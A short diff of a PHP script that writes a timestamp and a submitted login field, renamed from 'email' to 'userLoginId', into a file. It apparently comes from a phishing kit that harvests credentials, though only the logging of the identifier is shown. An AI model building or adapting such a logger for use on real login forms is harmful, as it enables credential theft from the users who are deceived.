@@ -26,7 +26,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     fwrite($handle, date("d-m-Y h:i:sa"));
     fwrite($handle, "\n");
 	
-    $email = $_POST["email"];
+    $email = $_POST["userLoginId"];
 	fwrite($handle, "Email");
     fwrite($handle, "    =  ");
     fwrite($handle, $email);
